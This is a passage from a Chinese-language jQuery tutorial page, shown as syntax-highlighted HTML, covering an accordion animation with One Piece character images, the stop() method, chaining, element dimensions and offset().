punctuation">></span></span>手风琴<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">  <span class="token selector">body </span><span class="token punctuation">{</span>      <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">16</span>px<span class="token punctuation">;</span>      <span class="token property">font-family</span><span class="token punctuation">:</span> <span class="token string">"YaHei Consolas Hybrid"</span><span class="token punctuation">;</span>      <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>      <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.accordion</span> </span><span class="token punctuation">{</span>      <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span>      <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">1140</span>px<span class="token punctuation">;</span>      <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">100</span>px auto <span class="token number">0</span> auto<span class="token punctuation">;</span>      <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>      <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.accordion</span> ul </span><span class="token punctuation">{</span>      <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.accordion</span> ul li </span><span class="token punctuation">{</span>      <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>      <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span>      <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">990</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.accordion</span> ul li span </span><span class="token punctuation">{</span>      <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>      <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span>      <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>      <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>      <span class="token property">color</span><span class="token punctuation">:</span> white<span class="token punctuation">;</span>      <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.accordion</span> ul li img </span><span class="token punctuation">{</span>      <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>      <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">600</span>px<span class="token punctuation">;</span>      <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">960</span>px<span class="token punctuation">;</span>      <span class="token property">float</span><span class="token punctuation">:</span> right<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar01</span> </span><span class="token punctuation">{</span>      <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar02</span> </span><span class="token punctuation">{</span>      <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">990</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar03</span> </span><span class="token punctuation">{</span>      <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">1020</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar04</span> </span><span class="token punctuation">{</span>      <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">1050</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar05</span> </span><span class="token punctuation">{</span>      <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">1080</span>px<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar06</span> </span><span class="token punctuation">{</span>      <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">1110</span>px  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar01</span> span </span><span class="token punctuation">{</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#09E0B5</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar02</span> span </span><span class="token punctuation">{</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#3D7FBB</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar03</span> span </span><span class="token punctuation">{</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#5CA716</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar04</span> span </span><span class="token punctuation">{</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#F28B24</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar05</span> span </span><span class="token punctuation">{</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#7C0070</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token selector"><span class="token class">.bar06</span> span </span><span class="token punctuation">{</span>      <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token function">rgb</span><span class="token punctuation">(</span><span class="token number">1</span>, <span class="token number">34</span>, <span class="token number">34</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">  <span class="token comment" spellcheck="true">// 脚本动画</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.accordion li'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>              <span class="token string">'left'</span><span class="token punctuation">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">30</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">prevAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                  <span class="token string">'left'</span><span class="token punctuation">:</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">30</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">each</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>              <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                  <span class="token string">'left'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token number">1140</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span>          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>accordion<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bar01<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>海贼王◉路飞<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/lufei.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>lufei<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bar02<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>海贼王◉索隆<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/suolong.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>suolong<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bar03<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>海贼王◉山治<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/shanzhi.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>shanzhi<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bar04<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>海贼王◉罗宾<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/robin.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>robin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bar05<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>海贼王◉乔巴<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/qiaoba.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>qiaoba<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bar06<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>海贼王◉乌索普<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../images/wusuopu.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>wusuopu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>停止动画需要使用<code>stop()</code>方法.</p><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span>selector<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span>stopAll<span class="token punctuation">,</span> goToEnd<span class="token punctuation">)</span><span class="token comment" spellcheck="true">// stopAll,默认是false,即仅停止活动的动画,运行排入队列的动画向后执行,true 清除动画队列.</span><span class="token comment" spellcheck="true">// goToEnd 是否立即完成当前动画,默认是false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>例子:</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#flip"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#panel"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">slideDown</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#stop"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"#panel"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css"> <span class="token selector"><span class="token id">#panel</span>,<span class="token id">#flip</span></span><span class="token punctuation">{</span>    <span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">5</span>px<span class="token punctuation">;</span>    <span class="token property">text-align</span><span class="token punctuation">:</span>center<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span><span class="token hexcode">#e5eecc</span><span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span>solid <span class="token number">1</span>px <span class="token hexcode">#c3c3c3</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector"><span class="token id">#panel</span></span><span class="token punctuation">{</span>    <span class="token property">padding</span><span class="token punctuation">:</span><span class="token number">50</span>px<span class="token punctuation">;</span>    <span class="token property">display</span><span class="token punctuation">:</span>none<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stop<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>停止滑动<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>flip<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>点我向下滑动面板<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>panel<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Hello world!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="3-链式调用"><a href="#3-链式调用" class="headerlink" title="3.链式调用"></a>3.链式调用</h3><blockquote><p>在相同的元素上运行多条<code>jQuery</code>命令.</p></blockquote><h3 id="jQuery-尺寸"><a href="#jQuery-尺寸" class="headerlink" title="jQuery 尺寸"></a><code>jQuery</code> 尺寸</h3><blockquote><p>获取和处理元素和浏览器窗口的尺寸,常用的方法有:</p><ul><li><code>width()</code></li><li><code>height()</code></li><li><code>innerWidth()</code></li><li><code>innerHeight()</code></li><li><code>outerWidth()</code></li><li><code>outerHeight()</code></li></ul><p>对应为:</p><p><img src="/posts/img_jquerydim.gif"></p></blockquote><h3 id="1-offset"><a href="#1-offset" class="headerlink" title="1.offset()"></a>1.<code>offset()</code></h3><blockquote><p>设置或获取匹配元素在当前窗口的相对偏移.</p><ul><li>用于获取偏移时:返回第一个匹配元素的偏移配置,返回一个对象,包含2个属性(<code>top/left</code>).</li><li>用于设置偏移时,设置所有匹配元素的偏移位置.</li></ul><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">// 返回偏移坐标$(selector).offset()// 设置偏移坐标$(selector).offset({top:value, left:value})// 使用函数设置偏移坐标$(selector).offset(function(index, currentoffset))// index - 返回集合中元素的 index 位置// currentoffset - 返回被选元素的当前坐标<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>offset<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token comment" spellcheck="true">// 获取位置</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">var</span> $box1 <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.box1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">var</span> $box <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.box'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>$box<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">var</span> $boxLoca <span class="token operator">=</span> $box<span class="token punctuation">.</span><span class="token function">offset</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            $box<span class="token punctuation">.</span><span class="token function">mouseover</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>                $box1<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                $box1<span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                    <span class="token string">'top'</span><span class="token punctuation">:</span> $boxLoca<span class="token punctuation">.</span>top<span class="token punctuation">,</span>                    <span class="token string">'left'</span><span class="token punctuation">:</span> $boxLoca<span class="token punctuation">.</span>left <span class="token operator">+</span> <span class="token number">50</span><span class="token punctuation">,</span>                    <span class="token string">'color'</span><span class="token punctuation">:</span> <span class="token string">'red'</span>                <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            $box<span 